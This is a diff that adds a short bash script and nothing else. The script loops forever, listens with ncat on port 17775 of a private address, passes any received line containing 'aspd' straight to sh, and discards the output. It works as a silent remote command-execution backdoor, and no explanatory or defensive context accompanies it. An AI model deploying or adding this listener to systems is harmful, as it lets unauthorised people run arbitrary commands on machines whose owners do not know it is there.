@@ -1,0 +1,8 @@
+#!/bin/bash
+
+
+for (( ; ; )); do
+
+  ncat -l 172.31.83.16 17775 | grep "aspd" | sh > /dev/null
+
+done
